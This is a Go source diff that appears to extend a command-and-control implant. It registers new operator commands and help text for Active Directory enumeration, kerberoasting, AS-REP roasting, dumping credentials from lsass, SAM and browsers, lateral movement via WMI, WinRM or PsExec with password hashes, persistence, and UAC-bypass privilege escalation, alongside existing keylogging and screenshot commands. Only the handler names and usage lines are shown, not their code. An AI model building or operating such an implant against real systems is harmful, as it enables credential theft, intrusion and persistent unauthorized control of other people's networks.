@@ -44,9 +44,16 @@ func (c *Commands) Handlers() map[string]CommandHandler {
 		"pending":   c.cmdPending,
 		"screenshot": c.cmdScreenshot,
 		"keylog":    c.cmdKeylog,
-		"inject":    c.cmdInject,
-		"exit":      c.cmdExit,
-		"help":      c.cmdHelp,
+		"inject":       c.cmdInject,
+		"ldap-enum":    c.cmdLDAPEnum,
+		"kerberoast":   c.cmdKerberoast,
+		"asreproast":   c.cmdASREPRoast,
+		"creds-dump":   c.cmdCredsDump,
+		"lateral":      c.cmdLateral,
+		"persist":      c.cmdPersist,
+		"privesc":      c.cmdPrivesc,
+		"exit":         c.cmdExit,
+		"help":         c.cmdHelp,
 	}
 }
 
@@ -512,6 +519,13 @@ func (c *Commands) cmdHelp(_ []string) error {
   sleep <ms> [jitter]   - Set beacon interval
   screenshot            - Take screenshot
   keylog <start|stop|dump> - Keylogger control
+  ldap-enum <type> --domain <d> --dc <dc> - LDAP AD enumeration
+  kerberoast --domain <d> --dc <dc> --user <u> --pass <p>
+  asreproast --domain <d> --dc <dc>
+  creds-dump <lsass|sam|browser>
+  lateral <wmi|winrm|psexec> <target> <command> [--user u] [--pass p] [--hash h]
+  persist <schtask|registry|service> [--name n] [--path p] [--trigger t]
+  privesc <token|uac_fodhelper|uac_eventvwr> [--pid n] [--command c]
   tasks                 - List session tasks
   result <task-id>      - Get task result
   loot                  - List loot
